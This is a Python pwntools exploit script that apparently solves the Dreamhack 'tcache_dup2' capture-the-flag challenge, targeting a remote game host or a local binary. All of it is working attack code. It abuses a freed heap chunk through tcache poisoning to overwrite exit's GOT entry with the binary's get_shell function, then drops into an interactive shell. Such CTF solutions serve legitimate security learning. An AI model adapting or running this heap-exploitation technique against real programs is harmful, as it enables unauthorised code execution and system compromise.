#!/usr/bin/env python3
from pwn import *

PORT = 19939
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./tcache_dup2_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x00000000004012FB
            b*0x0000000000401514
            b*0x0000000000401460
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(i): sla(b'> ', str(i).encode())

def create(sz, dt):
    menu(1)
    sla(b'Size: ', str(sz).encode())
    sa(b'Data: ', dt)

def edit(i, sz, dt):
    menu(2)
    sla(b'idx: ', str(i).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Data: ', dt)

def delete(i):
    menu(3)
    sla(b'idx: ', str(i).encode())

create(0x10, b'A'*8)
create(0x10, b'B'*8)
create(0x10, b'C'*8)

delete(2)

delete(1)
edit(1, 0x10, p64(elf.got.exit))
create(0x10, b'D'*8)

create(0x10, p64(elf.sym.get_shell))
menu(2)
sla(b'idx: ', str(7).encode())

p.interactive()